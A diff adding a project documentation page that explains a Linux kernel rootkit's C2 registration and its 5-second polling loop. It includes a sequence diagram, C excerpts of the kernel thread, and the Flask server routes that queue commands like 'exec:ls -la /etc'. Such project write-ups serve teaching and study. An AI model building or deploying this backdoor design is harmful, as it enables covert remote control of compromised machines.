@@ -1,0 +1,161 @@
+---
+import FeaturePage from '../../layouts/FeaturePage.astro';
+---
+
+<FeaturePage
+  title="Connection & Polling"
+  description="The rootkit registers with the C2 on load and spawns a kernel thread that polls for actions every 5 seconds."
+  badge="Mandatory"
+  points="3 pts"
+  slug="connection"
+>
+
+<section class="section">
+  <h2 class="section-title">// How it works</h2>
+  <div class="prose">
+    <p>
+      When <code>insmod wlkom.ko c2_host=&lt;IP&gt;</code> is run, <code>c2_init()</code> is called.
+      It first checks if a UUID file already exists at <code>/rootkit/uuid</code>.
+      If not, it sends <code>GET /register</code> to the C2, receives a fresh UUID, and saves it.
+      It then spawns a <strong>kernel thread</strong> (<code>kthread</code>) that loops indefinitely,
+      polling <code>GET /api/&lt;uuid&gt;/action</code> every 5 seconds.
+    </p>
+    <p>
+      The C2 server responds with <code>HTTP 204</code> (no content) when there is nothing to do,
+      or with the action string (e.g. <code>exec:ls -la</code>) as plain text with <code>HTTP 200</code>.
+      All communication uses <strong>HTTP/1.0</strong> — one TCP connection per request, closed immediately after.
+    </p>
+  </div>
+</section>
+
+<section class="section">
+  <h2 class="section-title">// Sequence diagram</h2>
+  <div class="diagram">
+    <svg viewBox="0 0 720 380" xmlns="http://www.w3.org/2000/svg" font-family="'Courier New',monospace">
+      <!-- Participants -->
+      <text x="130" y="30" text-anchor="middle" fill="#e6edf3" font-size="13" font-weight="bold">Rootkit (kernel)</text>
+      <text x="590" y="30" text-anchor="middle" fill="#e6edf3" font-size="13" font-weight="bold">C2 Server</text>
+      <line x1="130" y1="38" x2="130" y2="370" stroke="#30363d" stroke-width="1.5" stroke-dasharray="4,3"/>
+      <line x1="590" y1="38" x2="590" y2="370" stroke="#30363d" stroke-width="1.5" stroke-dasharray="4,3"/>
+
+      <!-- insmod -->
+      <rect x="60" y="48" width="140" height="26" rx="4" fill="#161b22" stroke="#00ff41" stroke-width="1" stroke-opacity="0.5"/>
+      <text x="130" y="65" text-anchor="middle" fill="#00ff41" font-size="11">insmod wlkom.ko</text>
+
+      <!-- GET /register -->
+      <line x1="130" y1="100" x2="570" y2="100" stroke="#00ff41" stroke-width="1.5" marker-end="url(#arr)"/>
+      <text x="350" y="93" text-anchor="middle" fill="#8b949e" font-size="10">GET /register</text>
+      <!-- UUID response -->
+      <line x1="570" y1="118" x2="150" y2="118" stroke="#e3b341" stroke-width="1.5" marker-end="url(#arrY)"/>
+      <text x="350" y="113" text-anchor="middle" fill="#8b949e" font-size="10">200 OK — uuid=12012406-...</text>
+
+      <!-- save uuid -->
+      <rect x="60" y="128" width="140" height="22" rx="3" fill="#161b22" stroke="#30363d" stroke-width="1"/>
+      <text x="130" y="143" text-anchor="middle" fill="#8b949e" font-size="10">write /rootkit/uuid</text>
+
+      <!-- spawn kthread -->
+      <rect x="60" y="158" width="140" height="22" rx="3" fill="#161b22" stroke="#00ff41" stroke-width="1" stroke-opacity="0.4"/>
+      <text x="130" y="173" text-anchor="middle" fill="#8b949e" font-size="10">kthread_run(c2_poll_fn)</text>
+
+      <!-- divider -->
+      <text x="350" y="196" text-anchor="middle" fill="#30363d" font-size="10">── polling loop (every 5 s) ──────────────────────</text>
+
+      <!-- poll 1 — no action -->
+      <line x1="130" y1="210" x2="570" y2="210" stroke="#00ff41" stroke-width="1.5" marker-end="url(#arr)"/>
+      <text x="350" y="203" text-anchor="middle" fill="#8b949e" font-size="10">GET /api/&lt;uuid&gt;/action</text>
+      <line x1="570" y1="226" x2="150" y2="226" stroke="#30363d" stroke-width="1" stroke-dasharray="3,3" marker-end="url(#arrG)"/>
+      <text x="350" y="221" text-anchor="middle" fill="#8b949e" font-size="10">204 No Content</text>
+
+      <!-- sleep 5s -->
+      <rect x="70" y="234" width="120" height="18" rx="3" fill="#161b22" stroke="#30363d" stroke-width="1"/>
+      <text x="130" y="247" text-anchor="middle" fill="#8b949e" font-size="10">sleep 5 s</text>
+
+      <!-- poll 2 — action received -->
+      <line x1="130" y1="262" x2="570" y2="262" stroke="#00ff41" stroke-width="1.5" marker-end="url(#arr)"/>
+      <text x="350" y="255" text-anchor="middle" fill="#8b949e" font-size="10">GET /api/&lt;uuid&gt;/action</text>
+      <line x1="570" y1="278" x2="150" y2="278" stroke="#e3b341" stroke-width="1.5" marker-end="url(#arrY)"/>
+      <text x="350" y="273" text-anchor="middle" fill="#8b949e" font-size="10">200 OK — exec:ls -la /etc</text>
+
+      <!-- dispatch -->
+      <rect x="60" y="288" width="140" height="22" rx="3" fill="#161b22" stroke="#00ff41" stroke-width="1" stroke-opacity="0.4"/>
+      <text x="130" y="303" text-anchor="middle" fill="#8b949e" font-size="10">handle_action("exec:...")</text>
+
+      <defs>
+        <marker id="arr"  markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto"><path d="M0,0 L0,6 L8,3 z" fill="#00ff41"/></marker>
+        <marker id="arrY" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto"><path d="M0,0 L0,6 L8,3 z" fill="#e3b341"/></marker>
+        <marker id="arrG" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto"><path d="M0,0 L0,6 L8,3 z" fill="#30363d"/></marker>
+      </defs>
+    </svg>
+  </div>
+</section>
+
+<section class="section">
+  <h2 class="section-title">// Key details</h2>
+  <div class="kv-grid">
+    <div class="kv-item"><span class="kv-key">Protocol</span><code>HTTP/1.0 over TCP</code></div>
+    <div class="kv-item"><span class="kv-key">C2 port</span><code>5000</code></div>
+    <div class="kv-item"><span class="kv-key">Poll interval</span><code>5 seconds</code></div>
+    <div class="kv-item"><span class="kv-key">UUID storage</span><code>/rootkit/uuid</code></div>
+    <div class="kv-item"><span class="kv-key">Thread</span><code>kthread_run()</code></div>
+    <div class="kv-item"><span class="kv-key">No-action code</span><code>HTTP 204</code></div>
+  </div>
+</section>
+
+<section class="section">
+  <h2 class="section-title">// Rootkit — c2_init() & polling thread</h2>
+  <div class="code-block">
+    <div class="code-header"><span>rootkit/src/c2.c</span><span class="lang">C</span></div>
+    <pre><code>{`int c2_init(void) {
+    ensure_rootkit_dir();
+    resolve_host(c2_host, &c2_addr);
+
+    // Reuse existing UUID if already registered
+    if (read_file(UUID_FILE, c2_uuid, UUID_LEN) < 36)
+        do_register();       // GET /register → save UUID
+
+    // Spawn polling kthread
+    c2_task = kthread_run(c2_poll_fn, NULL, "c2_poll");
+    return 0;
+}
+
+static int c2_poll_fn(void *unused) {
+    while (!kthread_should_stop()) {
+        snprintf(api_path, sizeof(api_path),
+                 "/api/%s/action", c2_uuid);
+
+        ret = http_get(api_path, action, sizeof(action));
+        if (ret > 0 && action[0] != '\\0')
+            handle_action(action);  // dispatch verb:args
+
+        schedule_timeout_interruptible(POLL_INTERVAL * HZ);
+    }
+    return 0;
+}`}</code></pre>
+  </div>
+</section>
+
+<section class="section">
+  <h2 class="section-title">// C2 Server — Flask routes</h2>
+  <div class="code-block">
+    <div class="code-header"><span>attacking_program/app.py</span><span class="lang">Python</span></div>
+    <pre><code>{`@app.route("/register")
+def register():
+    machine_uuid = str(uuid.uuid4())
+    database.register_machine(machine_uuid, request.remote_addr)
+    return machine_uuid, 200, {"Content-Type": "text/plain"}
+
+@app.route("/api/<machine_uuid>/action")
+def get_action(machine_uuid):
+    database.update_last_seen(machine_uuid)   # keeps "online" status fresh
+    action = database.pop_action(machine_uuid)
+    if action:
+        return action, 200, {"Content-Type": "text/plain"}
+    return "", 204                             # nothing queued`}</code></pre>
+  </div>
+  <div class="callout">
+    <span class="callout-icon">💡</span>
+    <p>The C2 dashboard uses <strong>AJAX polling</strong> (<code>GET /api/poll</code> every 3 s) to update the machine status and result list in real time without a page reload. A machine is considered <strong>online</strong> if its <code>last_seen</code> timestamp is less than 15 seconds old.</p>
+  </div>
+</section>
+
+</FeaturePage>
